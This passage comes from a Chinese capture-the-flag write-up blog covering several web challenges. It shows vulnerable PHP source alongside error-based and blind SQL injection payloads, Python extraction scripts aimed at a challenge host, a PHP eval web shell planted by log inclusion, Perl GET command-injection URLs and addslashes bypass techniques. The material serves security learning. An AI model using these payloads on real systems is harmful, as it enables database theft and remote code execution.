class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$address</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;订单修改成功&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">可以看到change.php 这里 对username,phone做了sql正则检查，address这块只作了addslashes处理。引号` &#39;` 在addslashes()作用下,变成` \&#39;` , 但是在插入数据库的时候又会变成 `&#39;`，因此address这里会引发二次注入。</code></pre></div><p>因此有</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201222038391.png" alt="image-20220122203811136"></p><p><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,30)),0x7e),1)#</code> 受长度限制这里分两块来读取</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201222038410.png" alt="image-20220122203848149"></p><p>来到修改收货地址这里做同样操作</p><p>flag{efbe90c4-e122-478a-8f4f-6</p><p>另一半操作同理 <code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),31,60)),0x7e),1)#</code> 不贴图了</p><h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>这种没啥思路 还是php的 基本都存在源码泄露，我照着这个思路，找到了泄露的源码   <code>image.php.bak</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;﻿?php<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=addslashes(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=addslashes(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=str_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=mysqli_fetch_array(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br>header(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br>readfile(<span class="hljs-variable">$path</span>);<br></code></pre></td></tr></table></figure><p>单拎出来sql语句 <code>select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;</code></p><p>如果id传入 <code>id=\\0</code>   经过addslashes处理过后，变成 <code>id=\\0</code>  在经过str_replace的处理变成 <code>id=\</code> </p><p>带入sql语句变成 <code>\&#39; or path=&#39;&#123;$path&#125;&#39;</code>  ，也就等于是帮我们插入了一个单引号，可以进行注入</p><p><code>http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=if(length(database())&gt;1,1,1)%23</code></p><p>我自己的二分脚本没搞出来不知道为啥，借鉴一下这位老哥的 <a href="https://blog.csdn.net/weixin_44037296/article/details/110918624">https://blog.csdn.net/weixin_44037296/article/details/110918624</a></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201231907876.png" alt="image-20220123190718690"></p><p>然后获取列名 因为这里过滤了 <code>‘</code> 和  <code> &quot;</code> 所以这里需要吧users 转为16进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>column_name = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">&#x27;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))=%d,1,-1)%%23&#x27;</span> % (i, c)<br>        r = requests.get(url+payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            column_name += <span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-built_in">print</span>(table_name)<br>            <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>哎？我发现原先作者这个脚本从127开始思路蛮不错的之前没想到，这样在字母较多情况可以极大提高效率。</p><p>user表有username和password字段。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&#x27;http://ec9c3894-d0c2-4b5c-ac73-6f230b4e86eb.node4.buuoj.cn:81/image.php?id=\\0&amp;path=or 1=&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>username = <span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">127</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">&#x27;if(ascii(substr((select group_concat(username) from users),%d,1))=%d,1,-1)%%23&#x27;</span> % (i, c)<br>        r = requests.get(url+payload)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;JFIF&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            username += <span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-built_in">print</span>(username)<br>            <span class="hljs-keyword">break</span><br>         <br></code></pre></td></tr></table></figure><p>跑出用户名 admin 密码 e6a6f6320923a5832077 我得研究一下我的二分脚本了哎…</p><p>然后文件传php被过滤这里是一个日志包含</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201232007779.png" alt="image-20220123200742680"></p><p>因此我们吧filename设置为一句话木马 <code>&lt;?=@eval($_POST[&#39;a&#39;]);?&gt;</code> 这样服务里留有一个访问这个马子的记录 我们访问连接getshell</p><h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>进入环境只有 注册，登录两个选项，其实这个时候就可以考虑是不是考察的二次注入 </p><p>然后注册一个 admin” 的账户 ，这样在修改密码的时候就报错</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201232027005.png" alt="image-20220123202722922"></p><p>这题也挺牛逼的，我这里没写密码和邮箱都…</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241700503.png" alt="image-20220124170050325"></p><p>fuzz了下，这里可以是用报错注入，不过</p><p>先构造 <code>a&quot;and(updatexml(1,concat(0x3a,(select(user()),0x3a),1)#</code>   过滤了and &#x3D;&gt; <code>a&quot;||(updatexml(1,concat(0x3a,(select(user()),0x3a),1)#</code></p><p>得到 root@localhost</p><p>拿表名</p><p><code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241717658.png" alt="image-20220124171722593"></p><p>之后 拿列名 <code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241719208.png" alt="image-20220124171906153"></p><p>但是flag不在这里，回到user表  </p><p><code>2&quot;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1)#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241722189.png" alt="image-20220124172233130"></p><p> 在构建payload的时候不难发现 这个is_her未免奇怪了点，联想到报错的长度限制 这里可以用正则表达式只提取这个字段</p><p><code>2&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;&amp;&amp;(column_name)regexp(&#39;^r&#39;))),0x7e)));#           </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241731857.png" alt="image-20220124173101800"></p><p><code>2&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#39;^f&#39;))),0x7e)));#        </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241732482.png" alt="image-20220124173232425"></p><p>flag形式8-4-4-12 这个很明显不符合 这里可以翻转或者截断，我这里用翻转了</p><p><code>2&quot;||(extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where((real_flag_1s_here)regexp(&#39;^f&#39;)))),0x7e)));#                    </code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241736165.png" alt="image-20220124173656105"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201241737253.png" alt="image-20220124173743176"></p><p>写到这里我意识到一个傻逼事儿我没保存前半部分flag，OCR了…</p><h2 id="HITCON-2017-SSRFme"><a href="#HITCON-2017-SSRFme" class="headerlink" title="[HITCON 2017]SSRFme"></a>[HITCON 2017]SSRFme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>       <span class="hljs-variable">$http_x_headers</span> = explode(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);<br>       <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$http_x_headers</span>[<span class="hljs-number">0</span>];<br>   &#125;<br><br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];<br><br>   <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>   @mkdir(<span class="hljs-variable">$sandbox</span>);<br>   @chdir(<span class="hljs-variable">$sandbox</span>);<br><br>   <span class="hljs-variable">$data</span> = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]));<br>   <span class="hljs-variable">$info</span> = pathinfo(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;filename&quot;</span>]);<br>   <span class="hljs-variable">$dir</span>  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, basename(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;dirname&quot;</span>]));<br>   @mkdir(<span class="hljs-variable">$dir</span>);<br>   @chdir(<span class="hljs-variable">$dir</span>);<br>   @file_put_contents(basename(<span class="hljs-variable">$info</span>[<span class="hljs-string">&quot;basename&quot;</span>]), <span class="hljs-variable">$data</span>);<br>   highlight_file(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>初看写马，但是我们的问题在哪儿？18行这里取basename 我们的文件可能不会被当做php文件解析，也就无法getshell</p><p>网上了解了一下，line 13的这个GET是   Lib for WWW in Perl中的命令 目的是模拟http的GET请求</p><div class="code-wrapper"><pre><code class="hljs">perl存在GET的rce漏洞，即perl的GET函数底层会使用open函数，而open函数支持file协议，这使得我们可以来读取文件有两个前提：文件必须存在，传入的内容必须含有 | </code></pre></div><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/?<span class="hljs-attribute">url</span>=file:bash -c /readflag|&amp;<span class="hljs-attribute">filename</span>=bash -c /readflag|   这一步是创建同名文件<br>/?<span class="hljs-attribute">url</span>=file:bash -c /readflag|&amp;<span class="hljs-attribute">filename</span>=123    把根目录readflag的内容给123并运行<br>最后访问 sandbox/md5(<span class="hljs-string">&quot;orange&quot;</span> .<span class="hljs-string">&quot;your_ip&quot;</span>)/123 即可<br></code></pre></td></tr></table></figure><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>存在 &#x2F;.git&#x2F; 源码泄露</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">这里修改一下session哎，这页开始就开始疯狂的复现了，我尽量每个都贴上参考师傅的链接  https://www.freesion.com/article/5996393110/这里的确是git源码泄露但是还需要还原到之前的历史版本才能看到完整的代码</code></pre></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">git log --all<br>git reset head --hard e5b2a2443c2b6d395d06960123142bc91123148c<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251912042.png" alt="image-20220125191200885"></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201251913955.png" alt="image-20220125191301795"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br>session_start();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><div class="code-wrapper"><pre><code class="hljs">可以看到 write 和 comment 都做了 addslashes处理,这个addslashes的数据存入后会从 `\&#39; ` =&gt; `&#39;` 这样当攻击者再次使用到这个数据的时候就会发生二次注入。</code></pre></div><p>别人总结的绕过addslashes的方法</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">设置数据库字符为gbk导致宽字节注入<br>使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br>url解码导致绕过addslashes<br>base64解码导致绕过addslashes<br>json编码导致绕过addslashes<br>没有使用引号保护字符串，直接无视addslashes<br>使用了stripslashes(去掉了\)<br>字符替换导致的绕过addslashes<br>参考<br>https://bbs.ichunqiu.com/thread<span class="hljs-string">-10899</span><span class="hljs-string">-1</span><span class="hljs-string">-1</span>.html<br></code></pre></td></tr></table></figure><p>奥对了，忘了写 账号 zhangwei 密码 zhangwei666   这种没密码的都可以试试自己去生成字典 <a href="https://www.bugku.com/mima/pass.php">https://www.bugku.com/mima/pass.php</a> </p><p>构造payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">        set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">            title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">            content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>可以看到这里是一个多行的sql语句所以闭合的话应该选用 <code>&#39;,content=database(),/*</code>这样的形式,最后在comment处 <code>*/#</code>    如下图</p><p><img 